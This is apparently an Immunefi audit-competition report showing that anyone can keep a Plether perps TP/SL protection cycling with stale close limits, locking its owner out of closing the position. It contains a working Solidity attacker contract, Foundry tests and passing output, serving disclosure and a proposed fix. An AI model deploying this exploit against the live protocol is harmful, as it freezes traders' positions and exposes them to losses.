# \#97912 [SC-High] Any caller can keep a Latched TP/SL protection permanently "Triggered" with stale close limits, locking the owner out of amending limits and closing the position

**Submitted on Nov 3rd 2026 at 21:26:01 UTC by @xbriefer for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97912
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 1 hour
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

# Any caller can keep a Latched TP/SL protection permanently "Triggered" with stale close limits, locking the owner out of amending limits and out of closing the position

## Severity
**Medium** — Impact (in-scope table): *Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)*; for traders not using an atomic-batching smart account the lock also amounts to *Temporary freezing of funds for at least 1 hour* (position margin cannot be released by the owner for as long as the attacker keeps cycling, at ≈ gas-only cost).

## Target
- `packages/perps/src/PositionProtectionBook.sol` — `retryPositionProtectionClose(uint64)` (L382-406), `amendLatchedPositionProtectionCloseLimits(uint64, CloseFinancialLimits)` (L315-328), `_cancel` (L408-419), `handleFailedProtectionAttempt` (L637-675)
- `packages/perps/src/router/OrderLiquidationBatchLogic.sol` — ordinary `commitOrder` rejects accounts with active protection (`OrderRouter__ProtectionActive`, ~L313)
- Frozen commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`

## Description
When a triggered TP/SL close attempt fails while the protected position is still intact, the protection moves `Triggered → Latched` (`handleFailedProtectionAttempt`, any reason except None/Executed/RiskOff/AccountLiquidated, including `Expired` and `ConstraintViolation`). The documentation promises the owner a recovery path from that state:

- `CANONICAL_ENTRYPOINTS.md:145-147`: "The owner may amend the close ceilings of a `Latched` protection … when the account has no pending Router order. This changes the limits used for a future retry."
- `WORKING_WITH_AI_AGENTS.md:284`: "protection becomes `Latched`; the owner may amend its limits before retrying."

However:
1. `retryPositionProtectionClose` is **permissionless** and re-commits a fresh close attempt with the protection's **stored** (stale) close limits. It immediately moves the protection back to `Triggered` with a new live child.
2. `amendLatchedPositionProtectionCloseLimits` requires status `Latched` **and** zero pending orders, so it reverts (`OrderRouter__ProtectionNotLatched`) whenever a child is live.
3. A `Triggered`/`Latched` protection cannot be cancelled or replaced (`_cancel`/`_replace` only accept `PendingOpen`/`Armed`), and while protection is active the owner cannot commit an ordinary close (`OrderRouter__ProtectionActive`).
4. Order execution and expiry are permissionless too.

So any third party can, **in a single transaction**, (a) fail the live child (execute it with any valid post-commit tick — it fails deterministically on the stale limits — or call `expireOrder` after its 60 s window, which needs no oracle data), which re-latches the protection, and (b) immediately call `retryPositionProtectionClose`. The protection is never observable in `Latched` with zero pending orders at a transaction boundary, so the owner can never amend the limits, and the only possible exit — a retry with the stale limits — keeps failing. The position stays open and exposed (carry keeps accruing, price risk, eventual liquidation) for as long as the attacker continues.

## Root cause
The retry entrypoint that re-uses owner-specified financial limits is callable by anyone and leaves no owner-exclusive window between a failed attempt and the next attempt; the owner's only remedy (`amendLatched…`) is gated on a state the attacker can always skip over atomically.

## Realistic trigger
Latching does not require unusual limits: e.g. a stop-loss with a `maxExecutionNotionalAssets` / `maxGrossAccountDebitAssets` / `maxActionChargeAssets` ceiling sized for the trigger price fails with `ConstraintViolation` after a gap through the trigger (notional, VPI or fees exceed the ceiling). The owner then needs to widen the ceilings — exactly the step the attacker blocks. (The headline PoC test uses exactly this stop-loss-gap scenario; an additional test uses a 1 USDG ceiling for determinism — any persistent failure reason behaves identically.)

## Impact
- Victim cannot amend limits, cancel the protection, or commit a close for the whole attack duration; the position is pinned open with stale limits (PoC: 8 cycles / 368 s, position size unchanged, `pendingOrderCounts == 1` after every attacker tx, stored limits unchanged).
- Attacker needs no funds in the protocol (USDG and clearinghouse balances unchanged in the PoC); retry is nonpayable and carries zero bounty. Cost ≈ 1.6–1.7 M gas per cycle (PoC measurement incl. mock overhead), i.e. well under $1 per cycle on Arbitrum; with the oracle-free expiry route one cycle per ~61 s suffices.
- Damage to the victim is market exposure they cannot exit (adverse PnL, carry, liquidation) — unbounded relative to attacker cost.
- An EOA trader has no atomic escape: their recovery needs two transactions (execute child → `Latched`, then `amend…`); whenever the attacker's retry is sequenced between them, the amend reverts and the lock persists — `test_B1_EoaTwoTx_AttackerInterleaves`. (Whether the attacker wins that race on Arbitrum depends on sequencer ordering; the attacker can also retry from a contract that watches for `Latched` every block.)
- **Mitigation available to some users (disclosed honestly):** the docs present an ERC-4337 SimpleAccount as the canonical trading account (DEPLOYMENT.md L425-436, WORKING_WITH_AI_AGENTS.md L15). Such an account *can* escape by atomically batching `executeOrder(child, validTick)` (or expiry once the window passed) `→ amendLatched… → retry` (`test_B1_Escape_VictimBatchesExecuteAmendRetry`). Neither the documented recovery flow ("owner may amend limits after relatch"), nor the SDK/keeper guidance describes this batch, so a user following the docs is locked; plain EOA traders (the Router accepts any `msg.sender` as account) have no atomic escape at all. SECURITY.md SEC-9 ("liveness depends on keepers; alert on prolonged `Latched` without live child") does not cover this: the attacker keeps a live child at all times, so the documented monitoring signal never fires.

## Known-issue check
Not covered by Cecuro MED-8/9/13/15/17/28/30, LOW-29/50/73, SEC-9 (unpaid retries / keeper liveness), the AI-scan protection items (trigger bounty paid before close, failed-attempt bounty, stale protection matching later position) or DEPLOYMENT.md L419-421 (advice to *honest* keepers not to continuously retry). No public issue/PR/commit after the freeze (only PR #136 test scripts, issue #137 risk params). GitHub search over all issues+PRs of Plether-Fi/plether-core (terms "latched" 4 hits, "retry" 19, "protection" 40; 2026-11-03) found only the feature/fix PRs ("feat(perps): add latched SL/TP close retries", "fix(perps): harden trader protection, liquidation pricing, and manual exits"), whose accepted trade-offs state "the owner may amend limits after relatch" — i.e. they rely on exactly the recovery path this report shows a third party can deny; no discussion of third-party retry lockout.

## Proof of Concept
File: `packages/perps/test/perps/audit/B1LatchedProtectionLockout.t.sol` (new test file only; no in-scope contract modified; mocks: Pyth + settlement token from the repo fixture `BasePerpTest`).

Command (from repo root):
```
forge test --root packages/perps --match-path test/perps/audit/B1LatchedProtectionLockout.t.sol -vvv
```
Tests:
0. **Headline — `test_B1_Realistic_StopLossGap_AttackerLocksOwner`**: LONG 10,000e18 @ 1e8 (margin 2,000e6), stop-loss 1.05e8 with `maxExecutionNotionalAssets = 10,500e6` (exactly the notional at the trigger), other ceilings unlimited. A gap tick at 1.08e8 (notional 10,800e6) triggers and the close fails with `ConstraintViolation` → `Latched`. Attacker then runs 8 cycles (execute-at-1.08e8 / expiry alternating); after every attacker tx and at 10 s steps the owner cannot amend/cancel/close; final: position still open, attacker and victim balances unchanged, stored ceiling still 10,500e6.
1. `test_B1_AttackerKeepsProtectionLatchedWithLiveChild_VictimLockedOut` — victim LONG 10,000e18 @ 1e8 with TP protection; trigger → child fails → attacker contract (no funds) does `executeOrder(child)`/expiry + `retryPositionProtectionClose` atomically, 8 cycles (4 ConstraintViolation, 4 Expired). At every step the victim's `amendLatchedPositionProtectionCloseLimits` reverts `ProtectionNotLatched`, `cancelPositionProtection` reverts, `commitOrder` close reverts `ProtectionActive`. Asserts: mid-tx status Latched (Expired re-latches), post-tx Triggered with 1 live child, position still open after ≥5 min, attacker balances unchanged, stored limits still stale.
2. `test_B1_Control_NoAttacker_VictimAmendsAndCloses` — same setup without attacker: victim amends and the retry closes the position (size 0) → the lock is caused by the third party.
3. `test_B1_EoaTwoTx_AttackerInterleaves` — EOA two-tx escape attempt is defeated.
4. `test_B1_Escape_VictimBatchesExecuteAmendRetry` — documents the atomic smart-account escape; logs attacker gas per cycle.
Output: `forge-test-vvv.log` (5 passed).

Note: the fixture uses BasePerpTest risk params; the mechanism is independent of DEPLOYMENT.md risk parameters (window 60 s, close bounty 0, retry nonpayable at release).

## Recommended fix
Any of:
- Let the protection owner atomically amend-and-retry (e.g. `amendLatchedAndRetry(id, limits)`), and allow `amendLatched…` while `Triggered` by invalidating the live child (owner-authorized), or
- Restrict `retryPositionProtectionClose` to the owner (or owner-approved operator) after a `ConstraintViolation`/user-limit failure, keeping it permissionless only for liveness-type failures (expiry, historical-data unavailability), or
- Give the owner an exclusive grace window after each failed attempt before third parties may retry.

## Proof of Concept

// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionBook} from "@plether/perps/interfaces/IPositionProtectionBook.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

interface IB1Router {

    function executeOrder(
        uint64 orderId,
        bytes[] calldata priceData
    ) external payable returns (OrderV3Types.ExecutionResult memory);

}

/// @dev Third party with no funds: fails the live child and re-commits a fresh one in ONE transaction.
contract B1Attacker {

    IB1Router public immutable ROUTER;
    IPositionProtectionBook public immutable BOOK;

    uint8 public lastStatusBeforeRetry;
    uint8 public lastTerminalReason;
    uint8 public lastLifecycleStatus;

    constructor(
        address router_,
        address book_
    ) {
        ROUTER = IB1Router(router_);
        BOOK = IPositionProtectionBook(book_);
    }

    function failChildAndRetry(
        uint64 protectionId,
        uint64 childId,
        bytes[] calldata priceData
    ) external returns (uint64 newChild) {
        OrderV3Types.ExecutionResult memory r = ROUTER.executeOrder(childId, priceData);
        lastLifecycleStatus = uint8(r.status);
        lastTerminalReason = uint8(r.terminalReason);
        lastStatusBeforeRetry = uint8(IPositionProtectionViews(address(BOOK)).getPositionProtection(protectionId).status);
        newChild = IPositionProtectionActions(address(BOOK)).retryPositionProtectionClose(protectionId);
    }

}

contract B1LatchedProtectionLockoutTest is BasePerpTest {

    IPositionProtectionBook internal protectionBook;
    IPositionProtectionActions internal protectionActions;
    IPositionProtectionViews internal protectionViews;

    address internal constant ALICE = address(0xA11CE);
    address internal constant TRIGGER_KEEPER = address(0x7106);
    address internal constant EXECUTION_KEEPER = address(0xE0EC);
    address internal constant CAROL = address(0xCA201);

    uint256 internal constant MARK_PRICE = 1e8;
    uint256 internal constant POSITION_SIZE = 10_000e18;
    uint256 internal constant POSITION_MARGIN_ASSETS = 2000e6;
    uint256 internal constant LONG_TAKE_PROFIT = 90_000_000;

    function setUp() public override {
        super.setUp();
        protectionBook = router.positionProtectionBook();
        protectionActions = IPositionProtectionActions(address(protectionBook));
        protectionViews = IPositionProtectionViews(address(protectionBook));
        _fundTrader(ALICE, 20_000e6);
        _fundTrader(CAROL, 20_000e6);
        _refreshMark(MARK_PRICE);
    }

    function _limitsTight() internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory) {
        // 1 USDC notional ceiling: unsatisfiable for a 10_000e18 @ 0.9 close (~9000 USDC notional)
        return PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: 1e6,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    function _limitsLoose() internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory) {
        return PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: 25_000e6,
            maxGrossAccountDebitAssets: 25_000e6,
            maxActionChargeAssets: 25_000e6,
            maxExplicitFeesAssets: 25_000e6
        });
    }

    function _setupTriggered() internal returns (uint64 protectionId, uint64 childId) {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params;
        params.takeProfitTriggerPrice = LONG_TAKE_PROFIT;
        params.closeLimits = _limitsTight();
        vm.prank(ALICE);
        protectionId = protectionActions.createPositionProtection(params);
        childId = _triggerAt(protectionId, LONG_TAKE_PROFIT);
    }

    function _status(
        uint64 protectionId
    ) internal view returns (uint8) {
        return uint8(protectionViews.getPositionProtection(protectionId).status);
    }

    function _victimBlocked(
        uint64 protectionId
    ) internal {
        // 1. owner cannot amend the stale limits. DEVIATION: with a live child the status is Triggered, so the
        // status check fires first (ProtectionNotLatched); PendingOrdersExist is unreachable in this state.
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _limitsLoose());
        // 2. owner cannot cancel
        vm.prank(ALICE);
        vm.expectRevert();
        protectionActions.cancelPositionProtection(protectionId);
        // 3. owner cannot commit an ordinary close
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(CfdTypes.Side.LONG, POSITION_SIZE, 0, 0, true);
    }

    function test_B1_AttackerKeepsProtectionLatchedWithLiveChild_VictimLockedOut() public {
        _startRecordingLogs();
        (uint64 protectionId, uint64 child) = _setupTriggered();
        B1Attacker attacker = new B1Attacker(address(router), address(protectionBook));

        uint256 attackerUsdgBefore = settlementToken.balanceOf(address(attacker));
        uint256 attackerChBefore = clearinghouse.balanceAssets(address(attacker));
        uint256 victimChBefore = clearinghouse.balanceAssets(ALICE);
        uint256 t0 = vm.getBlockTimestamp();
        uint8 triggered = uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered);
        uint8 latched = uint8(PositionProtectionTypes.PositionProtectionStatus.Latched);
        assertEq(_status(protectionId), triggered, "starts Triggered with live child");

        uint256 cycles = 8;
        uint256 expiryCycles;
        uint256 constraintCycles;
        for (uint256 i; i < cycles; ++i) {
            _victimBlocked(protectionId);
            uint64 oldChild = child;
            if (i % 2 == 0) {
                // route A: execute with a tick -> ConstraintViolation (stored limits unsatisfiable)
                bytes[] memory data = _mockPythUpdateData(LONG_TAKE_PROFIT);
                vm.prank(address(0xBAD));
                child = _callAttacker(attacker, protectionId, oldChild, data);
                assertEq(
                    attacker.lastTerminalReason(),
                    uint8(OrderV3Types.TerminalReason.ConstraintViolation),
                    "route A reason"
                );
                ++constraintCycles;
            } else {
                // route B: let the child expire, then expire+retry atomically
                uint64 submitBy = router.lifecycleBook().orderTiming(oldChild).executionDeadline;
                vm.warp(uint256(submitBy) + 1);
                vm.prank(address(0xBAD));
                child = _callAttacker(attacker, protectionId, oldChild, new bytes[](0));
                assertEq(attacker.lastTerminalReason(), uint8(OrderV3Types.TerminalReason.Expired), "route B reason");
                ++expiryCycles;
            }
            // Expired / ConstraintViolation both route to Latched (observed mid-tx before the retry)
            assertEq(attacker.lastStatusBeforeRetry(), latched, "failed attempt re-latched before retry");
            assertEq(attacker.lastLifecycleStatus(), uint8(OrderV3Types.LifecycleStatus.Failed), "child failed");
            assertGt(child, oldChild, "fresh child");
            assertEq(_status(protectionId), triggered, "retry installed live child");
            assertEq(router.pendingOrderCounts(ALICE), 1, "exactly one live child after attacker tx");

            // victim probes at every warp step while the child is live
            for (uint256 s; s < 3; ++s) {
                _victimBlocked(protectionId);
                vm.warp(vm.getBlockTimestamp() + 10);
            }
            _victimBlocked(protectionId);
        }

        (uint256 size,,,,,,) = engine.positions(ALICE);
        emit log_named_uint("cycles", cycles);
        emit log_named_uint("constraint-violation cycles", constraintCycles);
        emit log_named_uint("expiry cycles", expiryCycles);
        emit log_named_uint("simulated seconds", vm.getBlockTimestamp() - t0);
        emit log_named_uint("victim position size still open", size);
        emit log_named_uint("pendingOrderCounts(victim)", router.pendingOrderCounts(ALICE));
        assertGe(vm.getBlockTimestamp() - t0, 5 minutes, "simulated >= 5 min");
        assertEq(size, POSITION_SIZE, "position never closed");
        assertEq(settlementToken.balanceOf(address(attacker)), attackerUsdgBefore, "attacker USDG unchanged");
        assertEq(clearinghouse.balanceAssets(address(attacker)), attackerChBefore, "attacker clearinghouse unchanged");
        assertEq(clearinghouse.balanceAssets(ALICE), victimChBefore, "victim balance unchanged (no loss, just locked)");
        // stored limits remain the stale ones
        PositionProtectionTypes.CloseFinancialLimits memory stored = protectionViews.closeFinancialLimits(protectionId);
        assertEq(stored.maxExecutionNotionalAssets, 1e6, "stale limits never amendable");
    }

    function test_B1_Control_NoAttacker_VictimAmendsAndCloses() public {
        _startRecordingLogs();
        (uint64 protectionId, uint64 child) = _setupTriggered();

        // child fails on stale limits (executed by an ordinary keeper)
        bytes[] memory data = _mockPythUpdateData(LONG_TAKE_PROFIT);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(child, data);
        assertEq(uint8(r.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation), "fails on limits");
        assertEq(
            _status(protectionId), uint8(PositionProtectionTypes.PositionProtectionStatus.Latched), "Latched, no child"
        );
        assertEq(router.pendingOrderCounts(ALICE), 0, "no pending order");

        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _limitsLoose());

        vm.prank(CAROL);
        uint64 retryId = protectionActions.retryPositionProtectionClose(protectionId);
        bytes[] memory data2 = _mockPythUpdateData(LONG_TAKE_PROFIT);
        vm.prank(EXECUTION_KEEPER);
        r = router.executeOrder(retryId, data2);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "amended retry executes");
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, 0, "position closed");
        assertEq(protectionViews.activePositionProtectionId(ALICE), 0, "protection cleared");
    }

    function test_B1_Realistic_StopLossGap_AttackerLocksOwner() public {
        _startRecordingLogs();
        uint256 stopLoss = 105_000_000;
        uint256 gapPrice = 108_000_000;
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params;
        params.stopLossTriggerPrice = stopLoss;
        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: 10_500e6,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(params);
        uint64 child = _triggerAt(protectionId, gapPrice);
        B1Attacker attacker = new B1Attacker(address(router), address(protectionBook));

        uint256 attackerUsdgBefore = settlementToken.balanceOf(address(attacker));
        uint256 attackerChBefore = clearinghouse.balanceAssets(address(attacker));
        uint256 victimChBefore = clearinghouse.balanceAssets(ALICE);
        uint256 t0 = vm.getBlockTimestamp();
        uint8 triggered = uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered);
        uint8 latched = uint8(PositionProtectionTypes.PositionProtectionStatus.Latched);
        assertEq(_status(protectionId), triggered, "starts Triggered");

        for (uint256 i; i < 8; ++i) {
            _victimBlocked(protectionId);
            uint64 oldChild = child;
            if (i % 2 == 0) {
                bytes[] memory data = _mockPythUpdateData(gapPrice);
                vm.prank(address(0xBAD));
                child = attacker.failChildAndRetry(protectionId, oldChild, data);
                assertEq(
                    attacker.lastTerminalReason(), uint8(OrderV3Types.TerminalReason.ConstraintViolation), "route A"
                );
            } else {
                uint64 submitBy = router.lifecycleBook().orderTiming(oldChild).executionDeadline;
                vm.warp(uint256(submitBy) + 1);
                vm.prank(address(0xBAD));
                child = attacker.failChildAndRetry(protectionId, oldChild, new bytes[](0));
                assertEq(attacker.lastTerminalReason(), uint8(OrderV3Types.TerminalReason.Expired), "route B");
            }
            assertEq(attacker.lastStatusBeforeRetry(), latched, "re-latched before retry");
            assertEq(_status(protectionId), triggered, "live child");
            assertEq(router.pendingOrderCounts(ALICE), 1, "one live child");
            for (uint256 s; s < 3; ++s) {
                _victimBlocked(protectionId);
                vm.warp(vm.getBlockTimestamp() + 10);
            }
            _victimBlocked(protectionId);
        }

        (uint256 size,,,,,,) = engine.positions(ALICE);
        emit log_named_uint("simulated seconds", vm.getBlockTimestamp() - t0);
        assertGe(vm.getBlockTimestamp() - t0, 5 minutes, "simulated >= 5 min");
        assertEq(size, POSITION_SIZE, "position never closed");
        assertEq(settlementToken.balanceOf(address(attacker)), attackerUsdgBefore, "attacker USDG unchanged");
        assertEq(clearinghouse.balanceAssets(address(attacker)), attackerChBefore, "attacker ch unchanged");
        assertEq(clearinghouse.balanceAssets(ALICE), victimChBefore, "victim balance unchanged");
        assertEq(protectionViews.closeFinancialLimits(protectionId).maxExecutionNotionalAssets, 10_500e6, "ceiling");
    }

    function _oneAttackerCycle(
        B1Attacker attacker,
        uint64 protectionId,
        uint64 child
    ) internal returns (uint64 newChild, uint256 gasUsed) {
        bytes[] memory data = _mockPythUpdateData(LONG_TAKE_PROFIT);
        vm.prank(address(0xBAD));
        uint256 g = gasleft();
        newChild = attacker.failChildAndRetry(protectionId, child, data);
        gasUsed = g - gasleft();
        assertEq(_status(protectionId), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered), "Triggered");
    }

    function test_B1_Escape_VictimBatchesExecuteAmendRetry() public {
        _startRecordingLogs();
        (uint64 protectionId, uint64 child) = _setupTriggered();
        B1Attacker attacker = new B1Attacker(address(router), address(protectionBook));
        uint256 gasUsed;
        (child, gasUsed) = _oneAttackerCycle(attacker, protectionId, child);
        emit log_named_uint("attacker cycle gas (executeOrder fail + retry), cycle 1", gasUsed);
        (child, gasUsed) = _oneAttackerCycle(attacker, protectionId, child);
        emit log_named_uint("attacker cycle gas, cycle 2", gasUsed);

        // victim batch (smart account): one tx, no attacker action in between
        bytes[] memory data = _mockPythUpdateData(LONG_TAKE_PROFIT); // valid post-commit tick (mock Pyth)
        vm.startPrank(ALICE);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(child, data);
        assertEq(uint8(r.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation), "stale limits fail");
        assertEq(_status(protectionId), uint8(PositionProtectionTypes.PositionProtectionStatus.Latched), "Latched");
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _limitsLoose());
        uint64 newChild = protectionActions.retryPositionProtectionClose(protectionId);
        vm.stopPrank();
        assertGt(newChild, child, "fresh child with amended limits");

        bytes[] memory data2 = _mockPythUpdateData(LONG_TAKE_PROFIT);
        vm.prank(EXECUTION_KEEPER);
        r = router.executeOrder(newChild, data2);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "amended child executes");
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, 0, "position closed: escape works");
    }

    function test_B1_EoaTwoTx_AttackerInterleaves() public {
        _startRecordingLogs();
        (uint64 protectionId, uint64 child) = _setupTriggered();
        B1Attacker attacker = new B1Attacker(address(router), address(protectionBook));
        (child,) = _oneAttackerCycle(attacker, protectionId, child);

        // victim tx1: execute the live child -> fails on stale limits -> Latched
        bytes[] memory data = _mockPythUpdateData(LONG_TAKE_PROFIT);
        vm.prank(ALICE);
        router.executeOrder(child, data);
        assertEq(_status(protectionId), uint8(PositionProtectionTypes.PositionProtectionStatus.Latched), "Latched");

        // attacker front-runs victim tx2 with a retry on the stale limits
        vm.prank(address(0xBAD));
        protectionActions.retryPositionProtectionClose(protectionId);

        // victim tx2: amend fails
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _limitsLoose());
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, POSITION_SIZE, "still open");
    }

    function _callAttacker(
        B1Attacker attacker,
        uint64 protectionId,
        uint64 childId,
        bytes[] memory data
    ) internal returns (uint64) {
        return attacker.failChildAndRetry(protectionId, childId, data);
    }

    // --- helpers copied from PositionProtection.t.sol ---

    function _triggerAt(
        uint64 protectionId,
        uint256 price
    ) internal returns (uint64 linkedOrderId) {
        _mockPythUpdateData(price);
        bytes[] memory updateData = _livePriceData(price);
        vm.prank(TRIGGER_KEEPER);
        linkedOrderId = protectionActions.triggerPositionProtection(protectionId, updateData);
    }

    function _refreshMark(
        uint256 price
    ) internal {
        if (block.timestamp <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        router.updateMarkPrice(_livePriceData(price));
    }

    function _livePriceData(
        uint256 price
    ) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] =
                MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, block.timestamp, previous));
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

}


forge test --root packages/perps --match-path test/perps/audit/B1LatchedProtectionLockout.t.sol -vvv

$ forge test --root packages/perps --match-path test/perps/audit/B1LatchedProtectionLockout.t.sol -vvv
(frozen commit a82d4fefb02768e5b3bddcc97dee371eee24fea8; verbatim output)

No files changed, compilation skipped

Ran 5 tests for test/perps/audit/B1LatchedProtectionLockout.t.sol:B1LatchedProtectionLockoutTest
[PASS] test_B1_AttackerKeepsProtectionLatchedWithLiveChild_VictimLockedOut() (gas: 23628985)
Logs:
  cycles: 8
  constraint-violation cycles: 4
  expiry cycles: 4
  simulated seconds: 368
  victim position size still open: 10000000000000000000000
  pendingOrderCounts(victim): 1

[PASS] test_B1_Control_NoAttacker_VictimAmendsAndCloses() (gas: 6295912)
[PASS] test_B1_EoaTwoTx_AttackerInterleaves() (gas: 7120101)
[PASS] test_B1_Escape_VictimBatchesExecuteAmendRetry() (gas: 10066332)
Logs:
  attacker cycle gas (executeOrder fail + retry), cycle 1: 1693208
  attacker cycle gas, cycle 2: 1599320

[PASS] test_B1_Realistic_StopLossGap_AttackerLocksOwner() (gas: 23561114)
Logs:
  simulated seconds: 368

Suite result: ok. 5 passed; 0 failed; 0 skipped; finished in 25.74ms (60.79ms CPU time)

Ran 1 test suite in 26.18ms (25.74ms CPU time): 5 tests passed, 0 failed, 0 skipped (5 total tests)
